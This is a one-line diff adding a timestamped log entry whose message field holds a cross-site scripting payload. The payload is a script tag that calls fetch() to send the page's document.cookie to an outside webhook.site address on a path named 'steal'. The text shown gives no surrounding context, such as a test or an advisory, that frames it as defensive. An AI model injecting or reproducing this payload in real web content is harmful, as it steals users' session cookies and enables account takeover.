@@ -1,0 +1,1 @@
+[2025-02-14 15:21:26] | Message: <script>fetch('https://webhook.site/ad7a75b6-3087-47b1-9b4c-0dbed61acc9d/steal?cookie=' + document.cookie)</script>
